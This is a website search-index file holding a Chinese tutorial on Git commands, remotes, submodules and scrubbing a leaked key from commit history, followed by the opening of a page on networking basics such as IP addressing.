\u540e\u5728\u5176\u4e2d\u6dfb\u52a0</p> <p></p> <p>\u66f4\u52a0\u8be6\u7ec6\u7684\u89c4\u8303\u53ef\u89c1 angular</p> <ul> <li>type\uff1a\u66f4\u6539\u7c7b\u578b\uff08fix/feat/docs/refactor/perf/test/ci/...\uff09</li> <li>\u91cd\u5927\u66f4\u6539\u53ef\u4ee5\u5199\u00a0BREAKING CHANGE\u00a0\u6216\u00a0DEPRECATED\uff08\u5168\u5927\u5199\uff09</li> <li>scope\uff1a\u5f71\u54cd\u8303\u56f4\uff08\u53ef\u9009\uff0c\u6bd4\u5982\u5177\u4f53\u5f71\u54cd\u7684\u6a21\u5757\u7b49\uff09</li> <li>summary\uff1a\u66f4\u6539\u7684\u7b80\u8981\u63cf\u8ff0\uff0c\u82f1\u6587\u4e00\u822c\u73b0\u5728\u65f6\uff0c\u9996\u5b57\u6bcd\u5c0f\u5199\u53e5\u672b\u65e0\u53e5\u53f7</li> <li>body\uff1a\u8be6\u7ec6\u63cf\u8ff0\uff0c\u53ef\u9009</li> <li>footer\uff1a\u89e3\u51b3\u00a0issue\u00a0\u4e86\u53ef\u4ee5\u5199\u00a0<code>Fixes #_id_</code>\u00a0\u6216\u00a0<code>Closes #_id_</code></li> </ul>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/3_Git/#ii6-git-log","title":"II.6 git log","text":"<p>\u8f93\u5165 <code>git log</code> \u53ef\u4ee5\u770b\u5230\u4fee\u6539\u5386\u53f2</p> <p></p> <p>Help</p> <p>\u8fd9\u91cc\u6211\u4eec\u8fdb\u5165\u4e86 vim \u7f16\u8f91\u6a21\u5f0f\uff0c\u4e0d\u719f\u6089\u6ca1\u5173\u7cfb\uff0c\u6211\u4eec\u4ee5\u770b\u4e3a\u4e3b\uff0c\u60f3\u8981\u9000\u51fa\u9700\u8981\u8f93\u5165 <code>[:]q</code><sup>1</sup> \u5373\u53ef\u3002</p> <ul> <li>--oneline\uff1a\u6bcf\u4e00\u4e2a\u63d0\u4ea4\u4e00\u884c</li> <li>--graph\uff1a\u663e\u793a\u5206\u652f\u7ed3\u6784</li> <li>--stat\uff1a\u663e\u793a\u6587\u4ef6\u5220\u6539\u4fe1\u606f</li> <li>-p\uff1a\u663e\u793a\u8be6\u7ec6\u7684\u4fee\u6539\u5185\u5bb9</li> </ul> <p>\u53ef\u4ee5\u770b\u5230\u5728 commit \u540e\u9762\u8ddf\u4e86\u4e00\u4e32 40 \u4f4d\u7684\u54c8\u5e0c\u503c\uff0c\u662f\u6bcf\u4e2a\u63d0\u4ea4\u552f\u4e00\u7684 sha-1 \u6807\u8bc6\u7b26 \uff0c\u6211\u4eec\u53ef\u4ee5\u7528 <code>git show id</code> \u6765\u663e\u793a\u8be6\u7ec6\u4fe1\u606f\uff0c\u5728\u4e0d\u5f15\u8d77\u6b67\u4e49\u60c5\u51b5\u4e0b\u524d\u51e0\u4f4d\u5373\u53ef\uff0c\u4f8b\u5982\u8f93\u5165 <code>git show 6b26</code> </p> <p></p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/3_Git/#ii7-git-checkout-git-branch","title":"II.7 git checkout &amp;&amp; git branch","text":"<p>\u51c6\u5907\u5de5\u4f5c\uff1a\u6211\u4eec\u5148\u5206\u4e24\u6b21\u63d0\u4ea4\u4fee\u6539 2.txt \u6587\u4ef6\uff1a</p> <p></p> <p>\u53ef\u4ee5\u770b\u89c1\u5305\u62ec\u6700\u5f00\u59cb\u7684\u4e00\u6b21\u5171\u6709\u4e09\u6b21\u63d0\u4ea4\uff0c\u6211\u4eec\u53ea\u5173\u6ce8 line 1 line 2 \u5373\u53ef\u3002</p> <p>\u90a3\u4e48\u6211\u4eec\u60f3\u8981\u653e\u5f03\u7b2c\u4e8c\u6b21\u7684\u4fee\u6539\uff0c\u5373\u5220\u9664 line 2 \u7684 commit\uff0c\uff08\u4f7f\u7528 <code>git rm --cached</code> \u81ea\u7136\u662f\u4e00\u4e2a\u597d\u529e\u6cd5\uff0c\u4f46\u662f\u60f3\u8981\u653e\u5f03\u7684\u4fee\u6539\u5f88\u591a\u8be5\u600e\u4e48\u529e\uff1f \uff09\u6211\u4eec\u4f7f\u7528  <code>git checkout id</code> \u6765\u56de\u5230\u67d0\u6b21\u63d0\u4ea4\u5386\u53f2\u65f6\u7684\u72b6\u6001\u5373\u53ef\uff1a</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u7684\u72b6\u6001\u5206\u652f\u53d8\u4e3a\u4e86 <code>503cf8b</code> \uff08\u4f7f\u7528 <code>git status</code> \u4e5f\u80fd\u770b\u5230\uff09\uff1b\u4f7f\u7528 <code>git checkout master</code> \u5207\u6362\u56de\u6765\uff0c\u5f53\u7136\u4fee\u6539\u4e5f\u53c8\u4f1a\u56de\u6765\uff1a</p> <p></p> <p>\u6211\u4eec\u56de\u5230\u4e86 master\uff0c\u53ef\u4ee5\u8bf4\u4e22\u5931\u4e86 503cf8b  \u8fd9\u4e00\u63d0\u4ea4\u5386\u53f2\u7684\u4fee\u6539\u3002</p> <p>Knowledge</p> <p>\u4ec0\u4e48\u662f\u00a0HEAD\uff1a\u5f53\u524d\u5de5\u4f5c\u533a\u5728\u63d0\u4ea4\u5386\u53f2\u4e2d\u7684 \u6307\u9488\u3002</p> <p></p> <p>\u5f53\u7136\uff0c\u6211\u4eec\u53ef <code>git checkout 503cf8b</code> \u56de\u53bb\uff0c\u4f46\u662f\u4e00\u822c\u4eba\u4eec\u4e0d\u4f1a\u8bb0\u8fd9\u4e00\u4e32\u611f\u89c9\u6beb\u65e0\u610f\u4e49\u7684\u54c8\u5e0c\u503c\uff0c\u518d\u8005\u8bf7\u770b\uff1a</p> <p></p> <p>\u4ed6\u5411\u6211\u4eec\u53d1\u51fa\u63d0\u793a\uff0c\u5f53\u524d\u5904\u4e8e \"detached HEAD\" state \uff0c\u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u5f53\u524d\u505a\u7684\u4efb\u4f55\u4fee\u6539\u5c06\u4e0d\u5c5e\u4e8e\u4efb\u4f55\u5206\u652f\uff0c\u5f53\u6211\u4eec\u5207\u6362\u56de master \u6216\u8005\u5176\u4ed6\u5206\u652f\u65f6\uff0c\u6211\u4eec\u5c06\u4f1a\u4e22\u5931\u8fd9\u4e00\u4fee\u6539\uff08\u6bd5\u7adf\u4f60\u660e\u5929\u516b\u6210\u4e0d\u8bb0\u5f97 503cf8b \u662f\u4ec0\u4e48\u9b3c\u610f\u601d\uff09</p> <p>\u4f46\u662f\u4ece\u6700\u540e\u4e00\u884c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c<code>HEAD is now at 503cf8b line1</code> \u4e8e\u662f\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 <code>git checkout -b branch</code> \u6765\u5728\u5efa\u7acb\u4e00\u4e2a\u65b0\u7684\u5206\u652f\uff0c\u5176\u4e2d branch \u4e3a\u65b0\u5206\u652f\u7684\u540d\u5b57</p> <p></p> <p>Note</p> <p>\u5206\u652f</p> <ul> <li>\u521b\u5efa\u5206\u652f<ul> <li>git branch\u00a0name\uff1a\u57fa\u4e8e\u5f53\u524d\u00a0HEAD</li> <li>git branch\u00a0name id\uff1a\u57fa\u4e8e\u00a0id\u00a0\u63d0\u4ea4</li> </ul> </li> <li>\u67e5\u770b\u5206\u652f<ul> <li>git branch\uff08\u5e26\u00a0-a\u00a0\u663e\u793a\u8fdc\u7a0b\u5206\u652f\uff09</li> <li>git show-branch\u00a0\u66f4\u8be6\u7ec6</li> </ul> </li> <li>\u5207\u6362\u5206\u652f<ul> <li>git checkout\u00a0name</li> <li>git checkout -b\u00a0name\uff1a\u521b\u5efa\u5e76\u5207\u6362</li> </ul> </li> <li>\u5185\u5bb9\u6bd4\u8f83<ul> <li>git diff\u00a0branch1 branch2\uff1a\u6bd4\u8f83\u4e24\u4e2a\u5206\u652f</li> <li>git diff\u00a0branch\uff1a\u6bd4\u8f83\u5de5\u4f5c\u533a\u548c\u5206\u652f</li> <li>git diff\uff1a\u6bd4\u8f83\u5de5\u4f5c\u533a\u548c\u6682\u5b58\u533a</li> </ul> </li> <li>\u5220\u9664\u5206\u652f<ul> <li>git branch -d branch </li> </ul> </li> </ul> <p>\u5728\u4e24\u4e2a\u5206\u652f\u4e0a\u4fee\u6539\uff0c\u5728\u5408\u5e76\u524d\u4e8c\u8005\u4e92\u4e0d\u5e72\u6270\uff0c\u6709\u5229\u4e8e\u591a\u4eba\u5408\u4f5c</p> <ul> <li>\u4ec0\u4e48\u662f\u5206\u652f\u540d\uff1a\u548c\u00a0HEAD\u00a0\u4e00\u6837\uff0c\u4e5f\u662f\u4e00\u4e2a\u6307\u9488\uff08\u5b9e\u9645\u4e0a\u53eb\u5f15\u7528\u00a0ref\uff09</li> <li>\u53ef\u4ee5\u57fa\u4e8e\u00a0ref\u00a0\u4f7f\u7528\u00a0~\u00a0\u6216\u00a0^\u00a0\u5b9a\u4f4d\u7236\u63d0\u4ea4<ul> <li>~\u00a0\u8868\u793a\u7b2c\u4e00\u4e2a\u7236\u63d0\u4ea4\uff0c~2\u00a0\u8868\u793a\u7b2c\u4e00\u4e2a\u7236\u63d0\u4ea4\u7684\u7b2c\u4e00\u4e2a\u7236\u63d0\u4ea4</li> <li>^\u00a0\u8868\u793a\u7b2c\u4e00\u4e2a\u7236\u63d0\u4ea4\uff0c^2\u00a0\u8868\u793a\u7b2c\u4e8c\u4e2a\u7236\u63d0\u4ea4</li> </ul> </li> <li>\u4e00\u4e2a\u63d0\u4ea4\u53ef\u80fd\u4f1a\u6709\u591a\u4e2a\u7236\u63d0\u4ea4\uff08merge commit\uff09</li> </ul> <p></p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/3_Git/#ii8-git-merge","title":"II.8 git merge","text":"<p>\u6211\u4eec\u5728\u60f3\u8981\u4fdd\u7559\u7684\u5206\u652f\u4e0a\u952e\u5165 <code>git merge branch</code> \u540e\u53ef\u4ee5\u5c06 branch \u8fd9\u4e00\u5206\u652f\u7684\u4fee\u6539\u5185\u5bb9\u5408\u5e76\u5230\u5f53\u524d\u5206\u652f\u3002</p> <p>Example</p> <p>\u952e\u5165 <code>git branch -a</code> \u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5f53\u524d\u5904\u4e8e change1 \u5206\u652f\u4e0a\uff08\u8fd9\u4e00\u70b9\u6211\u4eec\u4ee5\u540e\u4e0d\u5728\u8d58\u8ff0\uff09\u63a5\u4e0b\u6765\u5c06 change 1 \u5408\u5e76\u81f3 master \u4e0a</p> <p> </p> <p>\u53ef\u4ee5\u770b\u5230\u8fd4\u56de\u4e86 <code>Already up to date.</code></p> <p>\u5408\u5e76\u7ed3\u679c\u4e00\u822c\u5206\u4e3a\u4e09\u79cd\uff1a</p> <p></p> <p>\u4e24\u79cd\u7279\u6b8a merge \u65b9\u6cd5\uff1a</p> <p></p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/3_Git/#ii9-git-tag","title":"II.9 git tag","text":"<p>git \u4f7f\u7528 tag \u6765\u63a7\u5236\u7248\u672c\u53f7\uff0c\u4f8b\u5982\u6211\u4eec\u952e\u5165 <code>git tag v0.0.1</code> \u540e\u56de\u8f66\uff0c\u5565\u90fd\u6ca1\u6709\uff0c\u4f46\u662f\u518d\u6b21 <code>git tag</code> \u53ef\u4ee5\u53d1\u73b0\uff1a</p> <p></p> <p><code>git show tag</code> \u53ef\u4ee5\u5c55\u793a\u67d0\u7248\u672c\u7684\u4fee\u6539\u5185\u5bb9\u7b49\uff1a</p> <p></p> <p>\u8be6\u5c3d\u7684\u89c4\u5219\u53ef\u67e5\u770b \u8bed\u4e49\u5316\u7248\u672c 2.0.0</p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/3_Git/#iii","title":"III \u8fdb\u9636\u64cd\u4f5c","text":"","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/3_Git/#iii1","title":"III.1 \u8fdc\u7a0b\u7248\u672c\u5e93","text":"<p>Info</p> <p>git \u8fd9\u7c7b\u7684 DVCS \u901a\u8fc7\u4f7f\u7528\u4e00\u4e2a\u201c\u6743\u5a01\u201d\u7684\u8fdc\u7a0b\u7248\u672c\u5e93 (remote repository) \u6765\u5b9e\u73b0\u534f\u4f5c\uff0c\u4f46\u662f\u8fdc\u7a0b\u7248\u672c\u5e93\u4e5f\u662f\u4e00\u4e2a\u666e\u901a\u7684\u00a0git\u00a0\u7248\u672c\u5e93\u3002</p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/3_Git/#iii11-git-push","title":"III.1.1 git push","text":"<p>git push\u00a0\u4f1a\u5c06\u672c\u5730\u7684\u63d0\u4ea4\u63a8\u9001\u5230\u8fdc\u7a0b\u7248\u672c\u5e93\uff0c\u4f46\u662f\u65e0\u6cd5\u76f4\u63a5\u00a0push\u00a0\u5230\u8fdc\u7a0b\u7248\u672c\u5e93\u68c0\u51fa\u7684\u5206\u652f\u4e2d</p> <p></p> <p>\u5f53\u6211\u4eec\u5c06\u8fdc\u7a0b\u7248\u672c\u5e93\u66f4\u6362\u68c0\u51fa\u5206\u652f\u65e2\u53ef\u4ee5\u4e86</p> <p></p> <p>\u56e0\u6b64\u8fdc\u7a0b\u4e00\u822c\u4f7f\u7528\u88f8\u7248\u672c\u5e93\uff08--bare\uff09</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u4e3b\u8981\u662f\u5c06 .git \u6587\u4ef6\u5939\u4e2d\u90e8\u5206\u5185\u5bb9\u653e\u8fc7\u6765\u4e86</p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/3_Git/#iii12-git-pull","title":"III.1.2 git pull","text":"<p>git pull\u00a0\u4f1a\u5c06\u8fdc\u7a0b\u7248\u672c\u5e93\u7684\u63d0\u4ea4\u62c9\u53d6\u5230\u672c\u5730\uff0c\u5305\u542b\u00a0git fetch\u00a0\u548c\u00a0git merge\u00a0\u4e24\u4e2a\u6b65\u9aa4</p> <p>\u4e0b\u9762\u7684\u56fe\u5f88\u597d\u5730\u6f14\u793a\u4e86\u8fdc\u7a0b\u7248\u672c\u5e93\u7684\u5de5\u4f5c\u6d41</p> <p></p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/3_Git/#iii13-git-remote-set-url","title":"III.1.3 git remote set-url","text":"<p>\u9700\u8981\u65f6\u53ef\u4ee5\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u6765\u66f4\u6539\u8fdc\u7a0b\u4ed3\u5e93\u7684 URL\uff1a</p> <p><code>git remote set-url origin https://github.com/username/repo.git</code></p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/3_Git/#iii2-submodule","title":"III.2 submodule","text":"<p>Question</p> <p>\u4e00\u4e2a\u00a0git\u00a0\u7248\u672c\u5e93\u4e2d\u5305\u542b\u53e6\u4e00\u4e2a\u7248\u672c\u5e93\u4f1a\u53d1\u751f\u4ec0\u4e48\uff1f</p> <p>git\u00a0\u4f1a\u4e0d\u5141\u8bb8\u6b63\u5e38\u00a0add/commit\uff0c\u8b66\u544a\u8fd9\u6837\u00a0clone\u00a0\u65f6\u4e0d\u4f1a\u5305\u542b\u5b50\u7248\u672c\u5e93</p> <p></p> <p>\u6211\u4eec\u901a\u8fc7 git submodule \u6765\u89e3\u51b3\u3002</p> <p>\u6839\u636e hint \uff0c\u952e\u5165 <code>git submodule add ./sub sub</code> \uff0c\u4f46\u662f\u53d1\u73b0\u62a5\u9519 <code>fatal: 'sub' already exists in the index</code>\uff0c\u8fd9\u9700\u8981\u6211\u4eec\u628a\u4e4b\u524d\u6682\u5b58\u533a\u7684\u5185\u5bb9\u5148\u6e05\u7a7a</p> <p></p> <p>\u770b\u5230\u591a\u4e86\u4e00\u4e2a .gitmodules \u6587\u4ef6\uff0c\u6253\u5f00\u770b\u770b</p> <p></p> <p>\u518d\u56de\u5934\u770b hint \u7b2c\u516d\u884c\u5c31\u660e\u767d\u4e86 path \u548c url \u7684\u610f\u601d\u4e86</p> <p>Tip</p> <p>\u5982\u679c\u4ed3\u5e93\u6258\u7ba1\u5728 GitHub \u4e0a\uff0curl \u662f\u5bf9\u5e94\u94fe\u63a5\uff0c\u8fd9\u6837\u624d\u80fd\u5728\u514b\u9686\u4ed3\u5e93\u65f6\u5e26\u4e0a submodule\u3002</p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/3_Git/#iii3-git","title":"III.3 Git \u7ed3\u6784","text":"<p>\u5728 vscode \u4e2d\u6211\u4eec\u53ef\u4ee5\u5f88\u6e05\u695a\u770b\u5230\u8fd9\u4e9b\u6587\u4ef6\uff08\u5939\uff09</p> <ul> <li>.git/hooks\uff1a\u94a9\u5b50\u811a\u672c\uff0c\u53ef\u4ee5\u5728\u7279\u5b9a\u7684\u64cd\u4f5c\u65f6 \u81ea\u52a8\u6267\u884c</li> <li>info logs\u00a0\u5b58\u653e\u4fe1\u606f\u3001\u65e5\u5fd7</li> <li>.git/objects\uff1a\u5b58\u50a8\u7684\u6240\u6709\u4e1c\u897f\u90fd\u5728\u8fd9\u91cc\u2757\ufe0f<ul> <li>\u6587\u4ef6\u540d\u662f\u5bf9\u8c61\u7684\u00a0sha1\uff0c\u4e14\u5934\u4e00\u4e2a\u5b57\u8282\u4f5c\u4e3a\u4e00\u5c42\u76ee\u5f55\uff08\u52a0\u901f\u6587\u4ef6\u7cfb\u7edf\uff09</li> <li>\u901a\u8fc7\u00a0git cat-file -p\u00a0id\u00a0\u53ef\u4ee5\u67e5\u770b\u5bf9\u8c61\u5185\u5bb9\uff08-t\u00a0\u67e5\u770b\u7c7b\u578b\uff09</li> <li>\u4e09\u79cd\u5bf9\u8c61\u7c7b\u578b\uff1acommit\u3001 tree\u3001 blob\uff08Binary Large Object\uff09\uff0c\u56fe\u89e3\u5982\u4e0b</li> <li></li> </ul> </li> </ul>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/3_Git/#iii4","title":"III.4 \u9879\u76ee\u5408\u4f5c","text":"","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/3_Git/#iii41-pull-requestpr","title":"III.4.1 pull request(PR)","text":"<p>\u5bf9\u4e8e\u4ed6\u4eba\u7684\u00a0repo\uff0c\u4f60\u662f\u6ca1\u6709\u529e\u6cd5\u76f4\u63a5\u00a0push\u00a0\u7684\uff0c\u5411\u5176\u4e2d\u6dfb\u52a0\u4ee3\u7801\u66f4\u6539\u90fd\u662f\u901a\u8fc7\u00a0pull request\u00a0\u8fdb\u884c\u7684\uff0c\u4e00\u822c\u6d41\u7a0b\u5982\u4e0b\uff0c\u8fd8\u6709\u4e00\u4e9b\u5176\u4ed6\u89c4\u8303\u3002</p> <p></p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/3_Git/#iv","title":"IV \u5b9e\u9645\u6848\u4f8b","text":"","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/3_Git/#iv1-push-cannot-contain-secrets","title":"IV.1 Push cannot contain secrets","text":"<p>\u4e00\u6b21\u63d0\u4ea4 CTF \u7684 writeup \u65f6\u51fa\u73b0\u9519\u8bef\uff1a</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u662f\u56e0\u4e3a git \u68c0\u6d4b\u5230\u9898\u76ee\u6240\u63d0\u4f9b\u7684\u7528\u4e8e\u653b\u51fb\u7684\u5bc6\u94a5\uff0c\u6240\u4ee5\u963b\u6b62\u4e86\u6211\u4eec\u63d0\u4ea4\u3002</p> <p>\u90a3\u4e48\u5e73\u65f6\u9047\u5230\u8fd9\u79cd\u60c5\u51b5\u6211\u4eec\u8be5\u5982\u4f55\u89e3\u51b3\uff1f</p> <p>\u8d77\u521d\u6211\u60f3\u5f97\u592a\u7b80\u5355\u4e86\uff0c\u76f4\u63a5\u4fee\u6539\u4e86\u518d git commit \uff1b\u8fd8\u662f\u88ab\u62d2\u7edd\u4e86\uff1b\u601d\u8003\u4e00\u756a\uff0c\u6211\u4eec\u7684\u6bcf\u6b21 commit \u90fd\u4f1a\u88ab\u8bb0\u5f55\u4e0b\u6765\uff1b\u5373\u4f7f\u6211\u73b0\u5728\u8fd9\u91cc\u4fee\u6539\u4e86\uff0c\u8fd8\u662f\u5c06\u5e26\u6709\u5bc6\u94a5\u7684\u90a3\u4e00\u7248\u63d0\u4ea4\u4e86\u3002</p> <p>\u53c2\u8003 chatgpt-4o-mini \u7ed3\u679c\uff1a</p> <p>\u8981\u79fb\u9664\u5305\u542b\u654f\u611f\u4fe1\u606f\u7684\u6587\u4ef6\u5728 Git \u63d0\u4ea4\u4e2d\u7684\u8bb0\u5f55\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528\u00a0<code>git rebase</code>\u00a0\u6216\u00a0<code>git filter-branch</code>\u3002\u4ee5\u4e0b\u662f\u4f7f\u7528\u00a0<code>git rebase</code>\u00a0\u7684\u6b65\u9aa4\uff1a</p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/3_Git/#iv11-1","title":"IV.1.1 \u6b65\u9aa4 1\uff1a\u67e5\u627e\u9700\u8981\u4fee\u6539\u7684\u63d0\u4ea4","text":"<p>\u9996\u5148\uff0c\u60a8\u9700\u8981\u627e\u5230\u8be5\u63d0\u4ea4\u4e4b\u524d\u7684\u63d0\u4ea4\u3002\u5728\u60a8\u7684\u60c5\u51b5\u4e2d\uff0c\u60a8\u8981\u4fee\u6539\u7684\u63d0\u4ea4 ID \u662f\u00a0<code>xxxxxxxxxxxxxxxxxx</code>\u3002</p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/3_Git/#iv12-2","title":"IV.1.2 \u6b65\u9aa4 2\uff1a\u5f00\u59cb\u4ea4\u4e92\u5f0f\u53d8\u57fa","text":"<p>\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\u4ee5\u5f00\u59cb\u4ea4\u4e92\u5f0f\u53d8\u57fa\uff1a</p> <p><code>git rebase -i HEAD~n</code></p> <p>\u5176\u4e2d\u00a0<code>n</code>\u00a0\u662f\u60a8\u60f3\u8981\u56de\u6eaf\u7684\u63d0\u4ea4\u6570\uff08\u5305\u62ec\u6709\u95ee\u9898\u7684\u63d0\u4ea4\uff09\u3002\u5982\u679c\u60a8\u4e0d\u786e\u5b9a\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u8f83\u5927\u7684\u6570\u5b57\uff0c\u4f8b\u5982\u00a0<code>10</code>\u3002</p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/3_Git/#iv13-3","title":"IV.1.3 \u6b65\u9aa4 3\uff1a\u7f16\u8f91\u63d0\u4ea4","text":"<p>\u5728\u6253\u5f00\u7684\u6587\u672c\u7f16\u8f91\u5668\u4e2d\uff0c\u627e\u5230\u5305\u542b\u654f\u611f\u4fe1\u606f\u7684\u90a3\u4e00\u884c\uff08\u5373\u00a0<code>xxxxxxxxxxxxxxxxxxx</code>\uff09\uff0c\u5c06\u5176\u524d\u9762\u7684\u00a0<code>pick</code>\u00a0\u66f4\u6539\u4e3a\u00a0<code>edit</code>\u3002\u4fdd\u5b58\u5e76\u5173\u95ed\u7f16\u8f91\u5668\u3002</p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/3_Git/#iv14-4","title":"IV.1.4 \u6b65\u9aa4 4\uff1a\u79fb\u9664\u654f\u611f\u4fe1\u606f","text":"<p>\u5f53 Git \u505c\u6b62\u5728\u8be5\u63d0\u4ea4\u65f6\uff0c\u60a8\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u547d\u4ee4\u6765\u79fb\u9664\u654f\u611f\u4fe1\u606f\uff1a</p> <p><code>nano docs/CTF/ZJUCTF2024/WEB.md</code></p> <p>\u5728\u7f16\u8f91\u5668\u4e2d\u5220\u9664\u76f8\u5173\u884c\uff0c\u7136\u540e\u4fdd\u5b58\u5e76\u9000\u51fa\u3002</p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/3_Git/#iv15-5","title":"IV.1.5 \u6b65\u9aa4 5\uff1a\u66f4\u65b0\u63d0\u4ea4","text":"<p>\u5b8c\u6210\u6587\u4ef6\u7f16\u8f91\u540e\uff0c\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\u66f4\u65b0\u8be5\u63d0\u4ea4\uff1a</p> <pre><code>git add docs/CTF/ZJUCTF2024/WEB.md\ngit commit --amend --no-edit \n</code></pre>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/3_Git/#iv16-6","title":"IV.1.6 \u6b65\u9aa4 6\uff1a\u7ee7\u7eed\u53d8\u57fa","text":"<p>\u63a5\u4e0b\u6765\uff0c\u7ee7\u7eed\u53d8\u57fa\u8fc7\u7a0b\uff1a</p> <p><code>git rebase --continue</code> \uff0c\u76f4\u5230\u8fbe\u5230\u6700\u65b0\uff1b\u6216\u8005\u4e5f\u53ef\u4ee5\u76f4\u63a5\u4e0b\u4e00\u6b65\u3002</p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/3_Git/#iv17-7","title":"IV.1.7 \u6b65\u9aa4 7\uff1a\u63a8\u9001\u66f4\u6539","text":"<p>\u6700\u540e\uff0c\u5c06\u4fee\u6539\u540e\u7684\u5386\u53f2\u63a8\u9001\u5230\u8fdc\u7a0b\u4ed3\u5e93\u3002\u7531\u4e8e\u5df2\u7ecf\u91cd\u5199\u4e86\u5386\u53f2\uff0c\u56e0\u6b64\u9700\u8981\u5f3a\u5236\u63a8\u9001\uff1a</p> <p><code>git push origin main</code></p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/3_Git/#v","title":"V \u53c2\u8003\u6587\u6863","text":"<p>\u9e64\u7fd4\u4e07\u91cc\u2014\u2014Git &amp; GitHub \u57fa\u7840\u4ecb\u7ecd </p> <ol> <li> <p><code>[]</code> \u5728\u6b64\u8868\u793a\u53ef\u9009\uff0c\u6709\u65f6\u76f4\u63a5\u8f93\u5165 <code>q</code> \u5c31\u80fd\u591f\u9000\u51fa\u3002\u00a0\u21a9</p> </li> </ol>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/4_base-of-web/","title":"4 base of web","text":"Summary <p>\u672c\u6587\u4ecb\u7ecd\u4e86\u7f51\u7edc\u57fa\u7840\u77e5\u8bc6\uff0c\u5305\u62ec IP \u534f\u8bae\u3001\u4f20\u8f93\u5c42\u534f\u8bae\u3001\u57df\u540d\u7cfb\u7edf\u3001HTTP \u534f\u8bae\u548c\u73b0\u4ee3\u7f51\u7edc\u5b89\u5168\u3002</p> <ul> <li>IP \u534f\u8bae\uff1a IPv4 \u548c IPv6 \u534f\u8bae\uff0c\u7528\u4e8e\u5728\u7f51\u7edc\u4e2d\u6807\u8bc6\u8bbe\u5907\u3002</li> <li>\u4f20\u8f93\u5c42\u534f\u8bae\uff1a TCP \u548c UDP \u534f\u8bae\uff0c\u7528\u4e8e\u5728\u7f51\u7edc\u4e2d\u4f20\u8f93\u6570\u636e\u3002</li> <li>\u57df\u540d\u7cfb\u7edf\uff1a DNS\uff0c\u7528\u4e8e\u5c06\u57df\u540d\u8f6c\u6362\u4e3a IP \u5730\u5740\u3002</li> <li>HTTP \u534f\u8bae\uff1a \u7528\u4e8e\u5728\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u4f20\u8f93\u7f51\u9875\u3002</li> <li>\u73b0\u4ee3\u7f51\u7edc\u5b89\u5168\uff1a HTTPS \u534f\u8bae\uff0c\u7528\u4e8e\u4fdd\u62a4 HTTP \u901a\u4fe1\uff1bTLS \u534f\u8bae\uff0c\u7528\u4e8e\u52a0\u5bc6\u548c\u8ba4\u8bc1\u901a\u4fe1\uff1bCA \u8bc1\u4e66\uff0c\u7528\u4e8e\u9a8c\u8bc1\u670d\u52a1\u5668\u8eab\u4efd\u3002</li> </ul>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/4_base-of-web/#ip-internet-protocol","title":"IP (Internet Protocol)","text":"<p>Wiki</p> <p>The\u00a0Internet Protocol\u00a0(IP) is the\u00a0network layer communications protocol\u00a0in the\u00a0Internet protocol suite\u00a0for relaying\u00a0datagrams\u00a0across network boundaries. Its\u00a0routing\u00a0function enables\u00a0internetworking, and essentially establishes the\u00a0Internet.</p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/4_base-of-web/#ipv4-internet-protocol-version-4","title":"IPv4 (Internet Protocol version 4)","text":"<ul> <li>\u7531\u00a04\u00a0\u4e2a\u6bb5 (octet)\u7ec4\u6210\uff0c\u6bcf\u4e2a\u6bb5\u00a08\u00a0\u4f4d\uff0c\u53ef\u4ee5\u7528\u4efb\u4f55\u8868\u793a\u00a032\u00a0\u4f4d\u6574\u6570\u7684\u65b9\u5f0f\u8868\u793a\u00a0IPv4\u00a0\u5730\u5740<ul> <li>10.78.18.216\u00a0=\u00a00xA4E12D8\u00a0=\u00a0172888792</li> <li>\u7406\u8bba\u4e0a\u6709\u00a0232232\u00a0\u4e2a\u4e0d\u540c\u7684\u5730\u5740\uff0c\u4f46\u5e76\u975e\u6240\u6709\u90fd\u53ef\u4ee5\u4f7f\u7528\uff0c\u6709\u590d\u6742\u7684\u5730\u5740\u5206\u914d\u673a\u5236</li> <li>2019\u00a0\u5e74\u00a011\u00a0\u6708\u00a025\u00a0\u65e5\uff0cRIPE NCC\u00a0\u5ba3\u5e03\u00a0IPv4\u00a0\u5730\u5740\u8017\u5c3d</li> </ul> </li> </ul>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/4_base-of-web/#ipv6-internet-protocol-version-6","title":"IPv6 (Internet Protocol version 6)","text":"<ul> 